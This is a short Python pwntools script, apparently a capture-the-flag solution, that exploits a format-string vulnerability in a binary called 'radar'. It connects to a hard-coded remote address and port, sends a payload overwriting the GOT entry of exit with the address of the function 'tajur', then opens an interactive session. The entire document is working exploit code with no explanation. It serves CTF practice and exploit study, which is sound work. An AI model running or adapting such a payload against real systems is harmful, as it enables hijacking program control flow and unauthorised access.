#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./radar", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 103.185.44.122 27429"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}


def exec_fmt(payload):
    with context.quiet:
        io = start()
    io.sendlineafter(b">> ", payload)
    io.recvuntil(b"dibaca --> ")
    resp = io.recvline()
    with context.quiet:
        io.close()

    return resp


# fs = FmtStr(execute_fmt=exec_fmt)

offset = 6

io = start()

payload = fmtstr_payload(
    offset=offset,
    writes={
        elf.got["exit"]: elf.sym["tajur"]},
    write_size="short")

io.sendlineafter(b">> ", payload)

io.interactive()
